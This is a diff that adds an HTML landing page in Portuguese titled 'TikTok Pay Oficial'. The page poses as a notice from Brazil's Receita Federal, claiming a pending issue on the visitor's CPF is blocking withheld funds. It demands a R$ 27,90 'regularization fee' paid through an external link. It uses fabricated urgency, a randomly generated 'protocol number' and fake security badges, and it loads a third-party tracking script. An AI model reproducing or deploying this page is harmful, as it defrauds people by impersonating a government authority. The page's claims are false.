@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script
+			src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+			data-token="b37547bb-ec0c-41df-a0ba-890b47c59feb"
+	>
+	</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="max-image-preview:large">
+    <title>TikTok Pay Oficial</title>
+    <link rel="icon" href="images/cropped-622e383d-a968-4ce6-8efa-0d2d91fc9977-gif-tiktok-e1735776294167-32x32.webp" sizes="32x32">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #003772 0%, #002a5a 100%);
+      color: #333;
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      line-height: 1.6;
+    }
+
+    .container {
+      max-width: 600px;
+      width: 100%;
+      background-color: #ffffff;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+      border-radius: 16px;
+      overflow: hidden;
+      border-top: 5px solid #205493;
+    }
+
+    .header {
+      background: linear-gradient(135deg, #205493 0%, #003772 100%);
+      padding: 25px 30px;
+      text-align: center;
+      border-bottom: 3px solid #205493;
+    }
+
+    .logo {
+      display: block;
+      width: 160px;
+      margin: 0 auto 15px auto;
+      filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.3));
+    }
+
+    .protocol-section {
+      margin-top: 15px;
+      padding-top: 15px;
+      border-top: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .protocol-label {
+      font-size: 0.7rem;
+      color: rgba(255, 255, 255, 0.8);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+
+    .protocol-number {
+      font-size: 0.9rem;
+      color: #ffffff;
+      font-weight: 700;
+      font-family: 'Courier New', monospace;
+      letter-spacing: 1px;
+    }
+
+    .main-content {
+      padding: 35px 30px;
+    }
+
+    .priority-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(32, 84, 147, 0.1);
+      color: #205493;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      margin-bottom: 25px;
+      border: 1px solid rgba(32, 84, 147, 0.3);
+    }
+
+    .priority-badge i {
+      font-size: 1rem;
+    }
+
+    h2 {
+      color: #205493;
+      font-size: 1.8rem;
+      margin-bottom: 20px;
+      text-align: center;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .content-section {
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 25px;
+      margin-bottom: 25px;
+      border: 1px solid #e9ecef;
+    }
+
+    p {
+      line-height: 1.7;
+      font-size: 1rem;
+      margin-bottom: 15px;
+      color: #333;
+    }
+
+    p:last-child {
+      margin-bottom: 0;
+    }
+
+    strong {
+      color: #205493;
+      font-weight: 700;
+    }
+
+    .valor-container {
+      background: linear-gradient(135deg, rgba(0, 112, 60, 0.1) 0%, rgba(0, 112, 60, 0.05) 100%);
+      border: 2px solid #00703c;
+      border-radius: 12px;
+      padding: 25px;
+      margin: 25px 0;
+      text-align: center;
+    }
+
+    .valor-label {
+      font-size: 0.85rem;
+      color: #6c757d;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .valor {
+      font-size: 2.8rem;
+      font-weight: 700;
+      color: #00703c;
+      margin: 10px 0;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .benefits-list {
+      background: rgba(32, 84, 147, 0.05);
+      border-left: 4px solid #205493;
+      border-radius: 8px;
+      padding: 20px;
+      margin: 25px 0;
+      text-align: left;
+    }
+
+    .benefits-list ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .benefits-list li {
+      font-size: 0.95rem;
+      line-height: 1.8;
+      margin-bottom: 12px;
+      padding-left: 25px;
+      position: relative;
+      color: #333;
+    }
+
+    .benefits-list li:last-child {
+      margin-bottom: 0;
+    }
+
+    .benefits-list li::before {
+      content: '\f00c';
+      font-family: 'Font Awesome 6 Free';
+      font-weight: 900;
+      position: absolute;
+      left: 0;
+      color: #00703c;
+      font-size: 0.9rem;
+    }
+
+    .warning-section {
+      background: rgba(169, 68, 66, 0.1);
+      border-left: 4px solid #a94442;
+      border-radius: 8px;
+      padding: 18px;
+      margin: 25px 0;
+      text-align: left;
+    }
+
+    .warning-section p {
+      font-size: 0.95rem;
+      color: #a94442;
+      margin: 0;
+      font-style: italic;
+      line-height: 1.6;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .warning-section i {
+      color: #a94442;
+      font-size: 1.1rem;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .btn-container {
+      text-align: center;
+      margin: 30px 0;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: linear-gradient(135deg, #005ea2 0%, #004a86 100%);
+      color: #fff;
+      padding: 18px 40px;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 24px rgba(0, 94, 162, 0.3);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      width: 100%;
+      max-width: 450px;
+    }
+
+    .btn:hover {
+      background: linear-gradient(135deg, #004a86 0%, #005ea2 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 32px rgba(0, 94, 162, 0.4);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    .btn i {
+      font-size: 1.1rem;
+    }
+
+    .footer-security {
+      background: #f8f9fa;
+      padding: 20px 30px;
+      border-top: 1px solid #e9ecef;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .security-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
+      color: #6c757d;
+    }
+
+    .security-item i {
+      color: #205493;
+      font-size: 0.85rem;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        border-radius: 12px;
+      }
+
+      .header {
+        padding: 20px;
+      }
+
+      .main-content {
+        padding: 25px 20px;
+      }
+
+      h2 {
+        font-size: 1.5rem;
+      }
+
+      .valor {
+        font-size: 2.2rem;
+      }
+
+      .btn {
+        font-size: 0.95rem;
+        padding: 16px 30px;
+      }
+
+      .benefits-list {
+        padding: 15px;
+      }
+
+      .benefits-list li {
+        font-size: 0.9rem;
+        padding-left: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+           <img src="logo1.png" alt="Receita Federal" class="logo"/>
+      <div class="protocol-section">
+        <div class="protocol-label">Protocolo</div>
+        <div class="protocol-number" id="protocolNumber">REG-2024-</div>
+      </div>
+    </div>
+
+    <div class="main-content">
+      <div class="priority-badge">
+        <i class="fas fa-exclamation-circle"></i>
+        <span>Comunicação Prioritária</span>
+      </div>
+
+      <h2>COMUNICAÇÃO PRIORITÁRIA</h2>
+
+      <div class="content-section">
+        <p><strong>Atualização Automática:</strong> Uma nova pendência foi detectada no sistema nacional vinculada ao seu <strong>CPF</strong>, impedindo a liberação total de valores retidos relacionados a movimentações digitais.</p>
+
+        <p>Para regularização imediata com prioridade de processamento, é necessário efetuar o pagamento da <strong>Taxa Nacional de Regularização</strong> no valor de:</p>
+      </div>
+
+      <div class="valor-container">
+        <div class="valor-label">Taxa Nacional de Regularização</div>
+        <div class="valor">R$ 27,90</div>
+      </div>
+
+      <div class="content-section">
+        <p>Esta taxa garante:</p>
+      </div>
+
+      <div class="benefits-list">
+        <ul>
+          <li>Liberação completa do CPF para transações financeiras digitais</li>
+          <li>Prevenção de bloqueios futuros e análises retroativas</li>
+          <li>Confirmação de status ativo junto ao sistema nacional</li>
+        </ul>
+      </div>
+
+      <div class="warning-section">
+        <p>
+          <i class="fas fa-exclamation-triangle"></i>
+          <span>Esta é uma janela única de regularização prioritária. Se esta página for fechada, o status de prioridade será automaticamente cancelado.</span>
+        </p>
+      </div>
+
+      <div class="btn-container">
+        <a class="btn" href="https://go.zeroonepay.com.br/d4uumi2abo">
+          <i class="fas fa-check-circle"></i>
+          <span>Quero Finalizar Meu Processo Agora</span>
+        </a>
+      </div>
+    </div>
+
+    <div class="footer-security">
+      <div class="security-item">
+        <i class="fas fa-shield-alt"></i>
+        <span>Transação Segura</span>
+      </div>
+      <div class="security-item">
+        <i class="fas fa-lock"></i>
+        <span>Dados Protegidos</span>
+      </div>
+      <div class="security-item">
+        <i class="fas fa-certificate"></i>
+        <span>Verificado</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Gera número de protocolo único
+    function generateProtocolNumber() {
+      const timestamp = Date.now();
+      const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+      return 'REG-2024-' + timestamp.toString().slice(-8) + random;
+    }
+
+    // Atualiza protocolo
+    document.getElementById('protocolNumber').textContent = generateProtocolNumber();
+  </script>
+</body>
+</html>
